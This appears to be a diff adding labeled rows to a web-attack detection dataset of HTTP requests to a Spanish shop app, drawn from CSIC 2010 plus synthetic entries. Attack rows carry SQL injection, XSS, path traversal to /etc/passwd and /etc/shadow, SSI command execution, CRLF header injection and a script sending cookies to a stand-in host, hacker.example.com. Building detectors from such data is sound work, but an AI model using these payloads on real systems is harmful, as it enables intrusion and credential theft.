+GET /tienda1/miembros/editar.jsp?modo=registro&login=brandais&password=amasAdo*ra&nombre=Helvecia&apellidos=Maurel+Boatella&email=guitti%40showcarsmadrid.sh&dni=56090256H&direccion=Grupo+Carmen%2C+0+&ciudad=Carratraca&cp=09268&provincia=Barcelona&ntc=6567532223328674&B1=Registrar,normal,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=gawargy&password=esquem%E1tic%27a&nombre=Di%F3genes&apellidos=Marchal+Bos&email=lorch8%40classroommanager.lv&dni=98648319P&direccion=Plza.+Compas+De+La+Trinidad%2C+80+&ciudad=Garganta+la+Olla&cp=34846&provincia=Castell%F3n&ntc=0242598973477682&B1=Registrar,attack,csic2010
+POST /tienda1/publico/anadir.jsp BODY: id=3&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=98&B1=A%F1adir+al+carrito,normal,csic2010
+POST /tienda1/publico/anadir.jsp BODY: id=1&nombre=Queso+Manchego&precio=85&cantidad=14&B1=A%F1adir+al+carrito,normal,csic2010
+GET /tienda1/publico/pagar.jsp?modo=insertar%27+DELETE+FROM+USERS&precio=5781&B1=Pasar+por+caja,attack,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=aida&password=plant%EDgrad*a&nombre=Tranquilino&apellidos=Atienza+Carrillo&email=goldoni%40923.pa&dni=63154198Q&direccion=Rua+Entrevias%2C+68+12-C&ciudad=Massalfassar&cpA=48220&provincia=Salamanca&ntc=5370548572435408&B1=Registrar,attack,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=3849&B1=Pasar+por+caja,normal,csic2010
+GET /tienda1/4861362529278789730.BAK,attack,csic2010
+GET /tienda1/publico/pagar.jsp.old,attack,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=louis-re&password=sentamiento&nombre=Casandro&apellidos=Fabr%E9s+Bueso&email=belcher_povich%40cementosanfranq.ec&dni=54525559B&direccion=Avenida+Juan+De+Austria%2C+143+7%3FE&ciudad=Guadalix+de+la+Sierra&cp=45312&provincia=Badajoz&ntc=6527837981883617&B1=Registrar,normal,csic2010
+GET /tienda1/miembros/editar.jsp?modo=registro&login=nataraja&password=d4upa&nombre=Zoraida&apellidos=Heras+Del+Moral&email=lowry-carmine%40filtraciondehumos.nc&dni=69549902H&direccion=C%2F+Albercuix%2C+27%2C+&ciudad=%C1greda&cp=50369&provincia=Ourense&ntc=0017018534732457&B1=Registrar,normal,csic2010
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=7625&B1=Confirmar%2F,attack,csic2010
+GET /tienda1/publico/pagar.jsp?modo=insertar&precioA=6381&B1=Confirmar,attack,csic2010
+GET /tienda1/publico/anadir.jsp?id=3&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=94&B1=A%F1adir+al+carrito,normal,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=marley&pwd=6%CDR8o&remember=off&B1=Entrar,normal,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=thege&password=abstruso&nombre=Guida&apellidos=Lambarri&email=mcclellan.truex%40faders.com.cl&dni=62140654J&direccion=Txapitela%2C+183+13%3FG&ciudad=Sant+Feliu+Sasserra&cpA=04569&provincia=Toledo&ntc=1284694854341650&B1=Registrar,attack,csic2010
+POST /tienda1/publico/anadir.jsp BODY: id=2&nombre=Vino+Rioja&precio=85&cantidad=3&B1=A%F1adir+al+carrito,normal,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=katina&pwd=vEnEcIANa&remember=off%2F&B1=Entrar,attack,csic2010
+GET /tienda1/publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=85&cantidad=65&B1=A%F1adir+al+carrito,normal,csic2010
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=6840&B1A=Confirmar,attack,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=alexine&pwd=1n154c3602&remember=on&B1=Entrar,normal,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=1599&B1A=Confirmar,attack,csic2010
+GET /tienda1/publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=85&cantidad=7&B1A=A%F1adir+al+carrito,attack,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=scanlan&password=2n5fe2ta2a&nombre=Rasmira&apellidos=Pavi%E9+Pool&email=gloves%40sms24h.mk&dni=92795576Y&direccion=Calle+Jose+Luis+De+Arrese%2C+105+1%3FF&ciudad=Ger&cp=24370&provincia=%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&ntc=7563981891605435&B1=Registrar,attack,csic2010
+POST /tienda1/publico/registro.jsp BODY: modoA=registro&login=gaconnie&password=81v58O&nombre=Dimas&apellidos=I%F1igo+Abelli&email=carbonell%40adondeir.um&dni=83627503D&direccion=Calle+Gran+Plaza%2C+103%2C+13%3FH&ciudad=San+Carlos+del+Valle&cp=15211&provincia=Guip%FAzcoa&ntc=5505928898200135&B1=Registrar,attack,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=marti&pwd=trombA&remember=on&B1=Entrar,normal,csic2010
+GET /tienda1/miembros/editar.jsp?modo=registro&login=filippi&password=desin%3Fteresado&nombre=Gayane&apellidos=Vilageli+Bonet&email=coggio_klemperer%40cortinasartesol.ro&dni=86367581M&direccion=Pasaje+Ojeda+S%2FN+7%3FE&ciudad=Santiago+de+Compostela&cp=23420&provincia=Pontevedra&ntc=3608872208421678&B1=Registrar,normal,csic2010
+POST /tienda1/publico/caracteristicas.jsp BODY: id=2%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E,attack,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=karl&password=81e9604o6o&nombre=Nin%F3n&apellidos=Crespo+Bullones&email=hagerthy.gilling%40inoxled.az&dni=98970543W&direccion=C%2F+Cardenal+Rossell%2C+85%2C+&ciudad=Melque+de+Cercos&cp=39375&provincia=Guip%FAzcoa&ntc=3795851836330194&B1=Registrar,normal,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=ivanyi0&password=%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&nombre=Crescencio&apellidos=Echevarr%EDa+Borras&email=tadio.bixby%40espaciopintor.eh&dni=98763423C&direccion=Torrent+De+Can+Quintana%2C+179%2C+&ciudad=Llocnou+de+la+Corona&cp=49430&provincia=Lleida&ntc=8110791105529474&B1=Registrar,attack,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=summerli&password=la5a6a5o1&nombre=R%F3mula&apellidosA=Huaranca+Atabales&email=darling%40escuelamontessori.gr&dni=83790899J&direccion=Calle+Arnedo+5+&ciudad=Masarac&cp=06850&provincia=Teruel&ntc=7550943100926472&B1=Registrar,attack,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=shaughan&password=63r5eInat4&nombre=Mailena&apellidos=Costales+Henkel&email=vol%40mercadozoom.fk&dni=33594876H&direccion=Rambla+Dels+Estudis+188%2C+3E&ciudad=Valoria+la+Buena&cp=09143&provincia=Ciudad+Real&ntc=5041701632668504&B1=Registrar,normal,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=jordanna3&password=desembarazadamente&nombre=Yamal&apellidos=Llebot+Sayago&email=doyle-murray%40ajuntamentbarcelona2-0.hn&dni=59201826X&direccion=Sierra+Alta+138+&ciudad=Iruelos&cp=19174&provincia=M%E1laga&ntc=6515740156899202&B1=Registrar,normal,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=triantap&password=lobera&nombre=Odelia&apellidos=Moll+Aybar&email=liedtke_truhitte%40ac-activos.gob&dni=75013152D&direccion=C%2F+Murillo%2C+106+5C&ciudad=Abrucena&cp=09191&provincia=Valencia&ntc=6986219017290364&B1=Registrar,normal,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=bennet&pwd=e9carcelador&remember=on&B1=Entrar,normal,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=coloads&pwd=riosellano&remember=on%2F&B1=Entrar,attack,csic2010
+GET /tienda1/miembros/editar.jsp?modo=registro&login=kizzee&password=malojal&nombre=Remigio&apellidos=Lizama+Vielmas&email=lundy%40academiaversal.pm&dni=90471972T&direccion=C%2F+Prado%2C+132+&ciudad=Dos+Hermanas&cp=48192&provincia=Cuenca&ntc=1286497435313401&B1=Registrar,normal,csic2010
+GET /tienda1/miembros/editar.jsp?modo=registro&login=carilyn&password=e1pirativo&nombre=Aventino&apellidos=Abell%F3+Lamarca&email=plang_schallert%40white-pearl-resort.kp&dni=66718383Y&direccion=C%2F+Misericordia%2C+57+7-H&ciudad=Baides&cp=35231&provincia=Valladolid&ntc=6302817063301722&B1=Registrar,normal,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=fae&password=inmoral&nombre=Stylianos&apellidos=Pinto+Poal&email=certa%40psicoencuentronline.tz&dni=50501754X&direccion=C%2F+Pombal%2C+163+&ciudad=Arnoia%2C+A&cpA=17136&provincia=Valencia&ntc=1666396246645136&B1=Registrar,attack,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=paxton&password=e4TE9ADa&nombre=Hermelinda&apellidos=Llorente+Batllori&email=hepburn%40%40martosfutb%40olsal%40a.cl&dni=79540644C&direccion=Cami%F1o+Dentagron+68%2C+&ciudad=San+Mart%EDn+del+R%EDo&cp=33909&provincia=Teruel&ntc=3393638948319901&B1=Registrar,attack,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=charo&pwd=malcom&remember=on&B1=Entrar,normal,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=corbett&pwd=aquistador&remember=on&B1=Entrar,normal,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=jada&password=0a3gan861&nombre=AsadAND+1%3D1&apellidos=Tarraubella+Grajera&email=seward_sepulvede%40promotorareina.bt&dni=05599581R&direccion=Cuesta+Del+Mercadillo%2C+30+&ciudad=Valdemeca&cp=44367&provincia=Palencia&ntc=2588788031004045&B1=Registrar,attack,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=robers&pwd=cArnalmentE&remember=off&B1=Entrar,normal,csic2010
+GET /tienda1/publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=39&cantidad=56&B1=A%F1adir+al+carrito,normal,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=ada&password=suspicacia&nombre=Ecio&apellidos=Salvo+Pardos&email=keat%40comercioenlacalle.mu&dni=10663563G&direccion=Calle+Isaac+Peral+37%2C+&ciudad=Jarque&cp=47440&provincia=Huesca&ntc=2333052430103872&B1=Registrar,normal,csic2010
+GET /download?file=1%20UNION%20SELECT%20username%2Cpassword%20FROM%20users,attack,synthetic
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=4748&B1=Pasar+por+caja,normal,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=etienne%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C&password=ahoga2iz8&nombre=Pastora&apellidos=Aleu+Alcaide&email=gulager-balsan6%40978.dm&dni=44544869X&direccion=Giuseppe+Micael%2C+174+8-H&ciudad=Valdefuentes+del+P%E1ramo&cp=06300&provincia=Ciudad+Real&ntc=5699405800944222&B1=Registrar,attack,csic2010
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=2152&B1=Pasar+por+caja%2F,attack,csic2010
+POST /products BODY: user=<IfRamE srC=jaVaScRipT:alERt(1)>,attack,synthetic
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=6636&B1=Confirmar,normal,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=rodrique&pwd=gu%27ad%27a%27l&remember=on&B1=Entrar,attack,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=meera&password=s2lfuro&nombre=Nazareth&apellidos=Lilliegren+Roca&email=berd.symo%40lawn.sv&dni=59195753D&direccion=Calle+Mallos+S%2FN%2C+5%3FG&ciudad=Sant+Hip%F2lit+de+Voltreg%E0&cpA=17741&provincia=%C1lava&ntc=8377727702267446&B1=Registrar,attack,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precioA=4459&B1=Pasar+por+caja,attack,csic2010
+"GET /search?user=X' unioN SelEcT nulL,NuLl--",attack,synthetic
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=petretta&pwd=cha%2Fnga&remember=off&B1=Entrar,attack,csic2010
+POST /download BODY: user=cheap flights,normal,synthetic
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=1916&B1=Confirmar,normal,csic2010
+GET /tienda1/publico/registro.jsp?modoA=registro&login=kari&password=c44dE96&nombre=Orestes&apellidos=Amargant&email=el2%40campanasextractoras.py&dni=57728968A&direccion=Calle+Salado%2C+148%2C+6%3FF&ciudad=Valderrobres&cp=16236&provincia=Girona&ntc=1272142225716686&B1=Registrar,attack,csic2010
+GET /tienda1/miembros/editar.jsp?modo=registro&login=li*bor7&password=al9u12z3&nombre=Basiana&apellidos=Fiesco+Terrazas&email=wakefield.yniguez%40aebo.so&dni=43471294Y&direccion=C%2F+Santa+Florentina+9%2C+11%3FH&ciudad=Asparrena&cp=16841&provincia=Lleida&ntc=6355628611222298&B1=Registrar,attack,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=rabadi&pwd=c1l674n&remember=on&B1=Entrar,normal,csic2010
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=5191&B1=Confirmar%2F,attack,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=masako&pwd=en%3F7IdiA62E&remember=off&B1=Entrar,normal,csic2010
+GET /download?page=../../etc/passwd,attack,synthetic
+POST /tienda1/publico/registro.jsp BODY: modo=registro&loginA=dorrie&password=acopio&nombre=Sergio&apellidos=Buix%F3+Diclo&email=ben-amotz-hehn%40clubforex.io&dni=53702702W&direccion=Pla%E7a+Josep+Maria+Folch+i+Torres%2C+15+5-G&ciudad=Villamandos&cp=09244&provincia=Badajoz&ntc=1143578341526495&B1=Registrar,attack,csic2010
+GET /products?q=..\..\windows\win.ini,attack,synthetic
+POST /products BODY: comment=admin,normal,synthetic
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=tsuyoshi&password=tAs9GO&nombre=Zanobia&apellidos=Amescua&email=rougerie%40cincocolores.sd&dni=88684338H&direccion=Plaza+De+La+Sevillana%2C+81%2C+5-E&ciudad=Altorric%F3n&cp=46128&provincia=Huesca&ntc=7892581903274474&B1=Registrar,normal,csic2010
+GET /login?email=%60id%60,attack,synthetic
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=heurich3&password=aFICI%F3n&nombre=Rendor&apellidos=Hosta+Ba%F1uls&email=gisladottir%40ingenieriadelaconstruccion.bh&dni=17217664W&direccionA=Calle+Suiza+S%2FN+10G&ciudad=Calzadilla+de+los+Barros&cp=34757&provincia=Badajoz&ntc=3373998516659876&B1=Registrar,attack,csic2010
+GET /tienda1/miembros/editar.jsp?modo=registro&login=luna&password=2un4141ali46r&nombre=Ado&apellidos=Macuare+Ribes&email=embree_chevret%40softwaremasservicio.bs&dni=59388065H&direccion=C%2F+Violeta%2C+S%2FN+9-B&ciudad=Ingenio&cp=40290&provincia=Navarra&ntc=7144713031308851&B1=Registrar,normal,csic2010
+POST /tienda1/publico/anadir.jsp BODY: id=3&nombre=Vino+Rioja&precio=39&cantidad=61&B1=A%F1adir+al+carrito,normal,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=matsuzak&password=de82g%F3gic8&nombre=Hayd%E9e&apellidos=Arrotcharen+Doniz&email=kontou%4015horas.wf&dni=06384093Y&direccion=Calle+Crucero-bouzas%2C+185%2C+&ciudad=Leaburu&cp=32730&provincia=Teruel&ntc=0473794196460600&B1=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org,attack,csic2010
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=9594&B1=Confirmar,normal,csic2010
+GET /tienda1/miembros/editar.jsp?modo=registro&login=saladna&password=e67e0m307r&nombre=Petronio&apellidos=Maduell+Rom%E0&email=ruchama_hellberg%40doloresmusculares.pw&dni=11700379A&direccion=Evangelina+Sobredo+Galanes%2C+S%2FN+12-C&ciudad=Purujosa&cp=08348&provincia=Lleida&ntc=8153377554882034&B1=Registrar,normal,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=oyama&pwd=chiapaany%250ASet-cookie%253A%2BTamper%253D1041264011025374727&remember=on&B1=Entrar,attack,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=roldan&pwd=gU5cIma&remember=on&B1=Entrar,normal,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=ramsden&pwd=acier9o&remember=on&B1=Entrar,normal,csic2010
+GET /tienda1/publico/anadir.jsp?id=3&nombreA=Vino+Rioja&precio=39&cantidad=3&B1=A%F1adir+al+carrito,attack,csic2010
+GET /products?file=../../../../etC/sHadow,attack,synthetic
+GET /tienda1/publico/registro.jsp?modo=registro&login=chatchai&password=chismorrear&nombre=Rachid&apellidos=Mingo+Elbaile&email=schkorski%40elxxi.zr&dni=26852714F&direccion=Paraguay%2C+88%2C+5%3FE&ciudad=Aulesti&cp=31754&provincia=La+Rioja&ntcA=2647099047093404&B1=Registrar,attack,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=zahnley&password=2mpAv8nAr&nombre=Am%E9n&apellidos=Doz&email=degeistirk%40meneamex.pr&dni=41909752A&direccion=C%2F+Zahara+De+Los+Atunes%2C+137%2C+9%3FB&ciudad=Cijuela&cp=10460&provincia=Le%F3n&ntc=8219697007119352&B1=Registrar,normal,csic2010
+POST /search BODY: user=laptop,normal,synthetic
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=1754%22+AND+%221%22%3D%221&B1=Confirmar,attack,csic2010
+POST /login BODY: comment=jaVascRiPT%3AAleRt%28DOcuMENT.coOkie%29,attack,synthetic
+GET /tienda1/publico/registro.jsp?modo=registro&login=dunik&password=ENcebra&nombre=Odelsia&apellidos=Vallado+Oliveras&email=stanger-kitabayashi7%40gestionsoftware.th&dni=35807418Y&direccion=C%2F+Valdes+Salas%2C+39+11%3FC&ciudad=Lana&cp=43785&provincia=Lleida&ntc=6821418764083161&B1=Registrar,normal,csic2010
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=7217&B1=Confirmar,normal,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=jantzi&password=j6ri714N7&nombre=Sonia&apellidos=Valiente+Mu%F1umer&email=stackpole.mccowen%40capitalinvest.cl&dni=52864416C&direccion=Avinguda+Velodrom+S%2FN+1%3FG&ciudad=Medio+Cudeyo&cp=17700&provincia=Lleida&ntc=2637703097461568&B1=Registrar,normal,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=hadrian&password=celula1io&nombre=Jaqueline&apellidos=Godoy+Fradera&email=shih_brusse%40professionalhost.jp&dni=53933880F&direccion=Plza.+De+Los+Conquistadores+182+&ciudad=Morales+del+Vino&cp=40171&provincia=Valencia&ntc=1541444021319279&B1=Registrar,normal,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=5949&B1=Confirmar%2F,attack,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=goupil&pwd=dEsArzOnAR&remember=on&B1=Entrar,normal,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=gabriele&pwd=alazana&remember=off&B1=Entrar,normal,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=alred&password=medus%3Fa&nombre=Andr%F3cies&apellidos=Ayll%F3n+Tamallangos&email=cabral_crowther%40frioelectric.br&dni=21335513T&direccion=Polux%2C+198%2C+&ciudad=Coru%F1a+del+Conde&cp=43869&provincia=C%E1ceres&ntc=0120957560122435&B1=Registrar,normal,csic2010
+GET /contact?id=please delete my old post,normal,synthetic
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=6226&B1=Confirmar%3F,attack,csic2010
+GET /tienda1/miembros/4861362529278789730.bak,attack,csic2010
+POST /tienda1/publico/anadir.jsp BODY: id=3&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=53&B1=A%F1adir+al+carrito,normal,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=3041&B1=Pasar+por+caja,normal,csic2010
+GET /download?q=john,normal,synthetic
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=9345&B1=Pasar+por+caja%2F,attack,csic2010
+GET /tienda1/publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=48&B1=A%F1adir+al+carrito,normal,csic2010
+GET /profile?email=images/logo.png,normal,synthetic
+GET /tienda1/imagenes/logo.gif/.INC,attack,csic2010
+GET /tienda1/miembros/editar.jsp?modo=registro&login=raimund&password=*eS8a24l&nombre=J%E9sica&apellidos=Casavieja+Carriquiri&email=elder%40parcalia.hn&dni=38847166M&direccion=Calle+Laguna+De+Pe%F1alara+171+12-E&ciudad=Aldea+de+San+Nicol%E1s%2C+La&cp=06460&provincia=C%E1ceres&ntc=1710045357867718&B1=Registrar,normal,csic2010
+GET /tienda1/miembros/editar.jsp?modo=registro&login=carissa&password=SUPeRsTici%F3N&nombre=Ildefonso&apellidos=Llach+Mund%F3&email=edmundsen%40sindns.info&dni=40146763X&direccion=Plza.+Arbizketa+129%2C+&ciudad=Sant+Jaume+de+Frontany%E0&cp=21291&provincia=Guadalajara&ntc=9173442177715818&B1=Registrar,normal,csic2010
+GET /tienda1/publico/caracteristicas.jsp?id=1any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727%250D%250A,attack,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=%7C&B1=Confirmar,attack,csic2010
+GET /tienda1/publico/4861362529278789730~,attack,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=chuck&password=s38und7705it*7&nombre=Aar%F3n&apellidos=Aro&email=skolnik-daye%40joll.ws&dni=35126766Q&direccion=C%2F+Zamora%2C+151%2C+1-B&ciudad=Aldearrodrigo&cp=05701&provincia=Zaragoza&ntc=4617331244727589&B1=Registrar,normal,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=nessa&pwd=copa&remember=off&B1=Entrar,normal,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=healy&pwd=c3er2e4ue15&remember=on&B1=Entrar,normal,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=jesshope&password=bisaRma&nombre=Tr%E1nsito&apellidos=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E&email=spalinger%40perrosmodelo.aw&dni=76108310E&direccion=C%2F+Algodonales%2C+129+&ciudad=Bele%F1a&cp=26312&provincia=Girona&ntc=4326433486745952&B1=Registrar,attack,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=bonny&password=*sepultura&nombre=Ives&apellidosA=Raurell&email=persky-scavran%40mystyleperfume.co&dni=92230868V&direccion=Pomponio+Mela+190%2C+11F&ciudad=Rozas+de+Puerto+Real&cp=37488&provincia=Santa+Cruz+de+Tenerife&ntc=5805853159182957&B1=Registrar,attack,csic2010
+GET /tienda1/miembros/editar.jsp?modo=registro&login=okai&password=3ra41&nombre=Custodio&apellidos=Hernandez+Agudelo&email=schiaftino%40showenvivo.com.sy&dni=49372725M&direccion=Plza.+Olavide+47+13E&ciudad=Abejuela&cp=25551&provincia=Madrid&ntc=3180844936634002&B1=AND+1%3D1,attack,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=kenta1&password=arraigadura&nombre=Shazmin&apellidos=Barba+Crous&email=cortadellas%40ppmanzanares.cx&dni=59137152N&direccion=Carretera+De+Vista-rica+S%2FN%2C+&ciudad=Boqui%F1eni&cp=09120&provincia=Le%F3n&ntc=3778695319344068&B1=Registrar,normal,csic2010
+GET /tienda1/miembros/imagenes/zarauz.jpg/.BAK,attack,csic2010
+POST /tienda1/publico/anadir.jsp BODY: id=1&nombre=Jam%F3n%27+Ib%E9ric-%27o&precio=85&cantidad=7&B1=A%F1adir+al+carrito,attack,csic2010
+GET /tienda1/miembros/editar.jsp?modo=registro&login=buggie&password=entre8e58r&nombre=Natana&apellidos=Canales+Cubr%EDa&email=dalmatoff_carrillo%40hipereuskadi.om&dni=80985651Y&direccion=C%2F+Velers%2C+57+4%3FC&ciudad=Rafelcofer&cp=43781&provincia=Badajoz&ntc=2275621874601888&B1=Registrar,normal,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=dangubic&password=BruCio&nombre=Galo&apellidos=B%E9cker+Rosselot&email=erdman-borgato%40cortinas-de-aire.nf&dni=27978102M&direccion=Calle+Chabarras%2C+186%2C+5-C&ciudad=Viveiro&cp=10271&provincia=Soria&ntc=2610269003230246&B1=Registrar,normal,csic2010
+GET /tienda1/miembros/imagenes/zarauz.jpg/4861362529278789730~,attack,csic2010
+GET /tienda1/publico/anadir.jsp?id=1&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=38&B1=A%F1adir+al+carrito,normal,csic2010
+POST /products BODY: user=alice@example.com,normal,synthetic
+GET /tienda1/publico/registro.jsp?modo=registro&login=meera&password=boquitue87a&nombre=Safo&apellidos=Koolmees+Moliner&email=nomis%40wormee.is&dni=13403604D&direccion=Escultor+Garcia+Mas+95%2C+1%3FF&ciudad=Sol%F3rzano&cp=04212%252B&provincia=Burgos&ntc=5498057012879468&B1=Registrar,attack,csic2010
+POST /tienda1/publico/anadir.jsp BODY: id=3%252B&nombre=Vino+Rioja&precio=39&cantidad=41&B1=A%F1adir+al+carrito,attack,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=ta9&password=2AramaLl77&nombre=Lino&apellidos=Arcos+Staiti&email=behmer_damiani%40barebackspain.za&dni=41194834V&direccion=Amor+De+Dios+14+1-C&ciudad=Casarrubios+del+Monte&cp=05450&provincia=Albacete&ntc=5476614268375502&B1=Registrar,normal,csic2010
+GET /tienda1/publico/autenticar.jsp?modoA=entrar&login=greer&pwd=452nz7da&remember=on&B1=Entrar,attack,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=fisico&password=aguzadera&nombre=Judas&apellidos=Belonne+Santaella&email=sinatra%40cementoscalibra.mil&dni=39960501W&direccion=Callejon+Huertas+94+7A&ciudad=Barakaldo&cp=49180&provincia=Navarra&ntc=1281450288895094&B1=Registrar,normal,csic2010
+GET /comment?comment=42,normal,synthetic
+GET /tienda1/miembros/editar.jsp?modo=registro&login=pierre-y&password=corb9ch4da&nombre=Erwin&apellidos=Pello+Melo&email=shdanoff%40esposo.com.tj&dni=73672811Q&direccion=Passatge+Credit%2C+93%2C+13-C&ciudad=Castej%F3n&cp=47800&provincia=Asturias&ntc=7652411292713718&B1=Registrar,normal,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=morton6&password=a5to4iro&nombre=Ari&apellidos=Pejoan+Ang%F3s&email=rosenthal%40tintasultravioleta.pm&dni=97428883D&direccion=Damian+De+Castro%2C+52%2C+&ciudad=Godojos&cp=43420&provincia=C%F3rdoba&ntc=5864494451512907&B1A=Registrar,attack,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=labossie2&pwd=carm%EDnea&remember=off&B1=Entrar,normal,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=pittam&pwd=PArTerO&remember=on&B1=Entrar,normal,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=dursse&password=embocadura&nombre=Geminiano&apellidos=Almeida+Tomasa&email=finlay-flood%40centralitatelefonicavirtual.ni&dni=15440835S&direccion=Bolta%F1a+117+7-E&ciudad=Petrer&cp=09219&provincia=A+Coru%F1a&ntc=3337033905720284&B1=Registrar,normal,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=adolpho&password=in977ili903&nombre=Mar%EDa+Candela&apellidos=Handal+Hach&email=wackers_donlin%40gesautonomos.bh&dni=42462633X&direccion=Grup+De+La+Pau%2C+108%2C+&ciudad=Reyero&cp=08691&provincia=Huesca&ntc=8418395367383016&B1=Registrar,normal,csic2010
+GET /tienda1/miembros/editar.jsp?modo=registro&login=sweeney&password=e57ol40&nombre=Jer%F3nima&apellidos=Zorrilla+Guevara&email=jarvis-wassmann%40classroommanager.pe&dni=54716363F&direccion=Faus+195%2C+&ciudad=Guarrate&cp=24730&provincia=C%E1diz&ntc=9834147083222005&B1=Registrar,normal,csic2010
+POST /search BODY: name=new york,normal,synthetic
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=flury&pwd=ajEnaDOr&remember=off&B1=Entrar,normal,csic2010
